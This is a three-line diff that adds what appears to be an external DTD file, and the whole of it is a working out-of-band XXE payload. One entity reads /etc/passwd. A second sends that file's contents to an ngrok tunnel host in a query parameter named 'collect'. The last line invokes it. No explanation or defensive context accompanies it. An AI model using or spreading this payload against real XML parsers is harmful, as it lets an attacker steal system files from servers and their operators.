@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % send SYSTEM 'https://336c-180-245-182-49.ngrok-free.app/?collect=%file;'>
+%send;
